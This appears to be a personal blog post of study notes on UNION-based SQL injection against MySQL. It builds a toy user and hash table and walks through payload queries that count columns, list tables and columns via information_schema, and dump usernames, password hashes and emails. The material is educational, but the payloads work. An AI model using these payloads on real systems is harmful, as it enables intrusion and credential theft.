---
layout: post
title: "Notes on SQL injection"
description: Personal notes on some SQL injection techniques
series: application_security
titleImage:
    file: 'title.png'
---

## SQL Injection - Enumerating the Databse Using `UNION`
*Thanks to [hackingarticles.in](https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/)* for the content. These are my notes on the same process.

## 1. UNION 

The UNION keyword may be used in a SQL injection payload to retrieve data from other tables within the database. The following Schema defines two tables and populates example data:

```SQL
CREATE TABLE `wp_users` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_login` varchar(60) NOT NULL DEFAULT '',
  `user_pass` varchar(64) NOT NULL DEFAULT '',
  `user_email` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`));
    
CREATE TABLE `important_hashes` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `algorithm` varchar(10) NOT NULL DEFAULT '',
  `hash` varchar(900) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`));

INSERT INTO `wp_users`(user_login, user_pass, user_email) VALUES ('thehacker4chan','4E46779A9B6C2F8897062B9BC13AAB06','zip.squibbles@vghs.edu');
INSERT INTO `important_hashes` (algorithm, hash) VALUES ('md5',"4E46779A9B6C2F8897062B9BC13AAB06");
```

To obtain data from the `important_hashes` table by appending SQL instructions to a `SELECT` statement on the `wp_users` table, append the UNION keyword followed by the information to be returned. Keep in mind that in order for the SQLi payload to be executed, the `SELECT` on the right side of a `UNION` statement must return the same numbers of columns and rows as the `SELECT` on the left side. For the above schema, the following will return a valid result:

### 1. UNION returning arbitary data
<br>
*Query*
```SQL
select * from wp_users where id = -1 union select 1,2,3,4;
```

*Result*

```
| ID  | user_login | user_pass | user_email |
| --- | ---------- | --------- | ---------- |
| 1   | 2          | 3         | 4          |
```
Lets break that down.

- In a normal situation, an id of `-1` would not return anything. It is used here to silence the output from the left-positioned `SELECT` statement.
- Because the schema for the left side has four columns (ID, user_login, user_pass, and user_email), the right hand select needs to specify four columns. As an attacker, we won't know how many columns the left hand side has, however. To find how many, simply keep adding values to the right select columns until the payload works.
- Even then, digits by themselves only show how many columns are in the left side's table. Replace the digits with other things to get more interesting results:

## 2. SELECT returning data from another table
<br>
*Query*
```SQL
select * from wp_users where id = 1 union select algorithm,hash,3,4 from important_hashes;
```

*Result*
```
| ID  | user_login                       | user_pass | user_email |
| --- | -------------------------------- | --------- | ---------- |
| md5 | 4E46779A9B6C2F8897062B9BC13AAB06 | 3         | 4          |
```
note that the heading here shows columns from the left side `SELECT` statement, not the right.

The digits used to match the column count between the two sides can also be replaced with information functions. These are built into the database system.
### SELECT returning data from the database
```SQL
select * from wp_users where id = 1 union select database(),version(),schema(),current_user();
```

See appendix [1] for a more complete list of these functions.

## 3. Identifying data to return in `UNION SELECT`

Perhaps you want data from other tables in the databse, or you want to learn more about the structure of the database. You can do so by telling select to return data from the `information_schema` [2](2), specifically its `TABLES` table [3](3). This tables columns looks like:

```
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | ... |
| ------------- | ------------ | ---------- | --- |
```

The most immediatley useful of these is the `TABLE_NAME` column. We can use this to return a list of the databases tables:

*Query*
```SQL
select * from wp_users where id = -1 union select table_name,2,3,4 from information_schema.tables where table_schema = database()
``` 
*Result

```
| ID               | user_login | user_pass | user_email |
| ---------------- | ---------- | --------- | ---------- |
| important_hashes | 2          | 3         | 4          |
| wp_users         | 2          | 3         | 4          |
```

Lets break this down. 

 - select the `TABLE_NAME` column,
 - along with the digits 2,3,4 
 - from the `information_schema` table
 - where the `table_schema` column is the current databse.

This is all useful only if you can see the result. Sometimes the webpage will only show one result from the SQL query. An example of this would be a situation where we only see the `important_hashes` table on the webpage after the above query is run. To learn what the other tables are, simply append the `LIMIT` keyword to the query:

*Query*
```SQL
select * from wp_users where id = -1 union select table_name,2,3,4 from information_schema.tables where table_schema = database() limit 0,1
```
The result would be the first table listed in the `information_schema` tables table. `0,1` returns the `0th` table and only `1` table. To see the next table, increment the 0 (e.g. `1,1`).

Repeat this until no new tables are shown to identify all of the databses tables.

A faster approach to this is to instead use the built-in `group_concat()` function on the `SELECT`.

*Query*
```SQL
select * from wp_users where id = -1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database()
```

*Result*
```
| ID                        | user_login | user_pass | user_email |
| ------------------------- | ---------- | --------- | ---------- |
| important_hashes,wp_users | 2          | 3         | 4          |
```

## 4. Obtaining the column names in a table

In 3. we saw how to obtain the tables in a databse. Once you've found a target table, to get its columns, use the `information_schema.columns` table on the target:

*Query*
```SQL
select * from wp_users where id = -1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='wp_users'
```

*Result*
```
| ID                                 | user_login | user_pass | user_email |
| ---------------------------------- | ---------- | --------- | ---------- |
| ID,user_login,user_pass,user_email | 2          | 3         | 4          |
```

## 5. Obtaining entries from a table

Now that we know which columns are available to query, simply do so:

*Query*
```SQL
select * from wp_users where id = -1 union select id,user_login,user_pass,user_email from wp_users
```

*Result*
```
| ID  | user_login     | user_pass                        | user_email             |
| --- | -------------- | -------------------------------- | ---------------------- |
| 1   | thehacker4chan | 4E46779A9B6C2F8897062B9BC13AAB06 | zip.squibbles@vghs.edu |
```

# Appendix

[1] [MySQL Information Functions](https://www.w3resource.com/mysql/mysql-information-functions.php)
```
MySQL BENCHMARK() 
MySQL CHARSET() 
MySQL COERCIBILITY() 
MySQL COLLATION() 
MySQL CONNECTION_ID() 
MySQL CURRENT_USER(), CURRENT_USER 
MySQL DATABASE() 
MySQL FOUND_ROWS() 
MySQL LAST_INSERT_ID() 
MySQL ROW_COUNT() 
MySQL SCHEMA() 
MySQL USER() 
MySQL SESSION_USER() 
MySQL SYSTEM_USER() 
MySQL VERSION() 
```
[2] http://sqlfiddle.com/<br>
[3] https://docs.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/system-information-schema-views-transact-sql?view=sql-server-2017<br>
[4] https://dev.mysql.com/doc/refman/8.0/en/tables-table.html<br>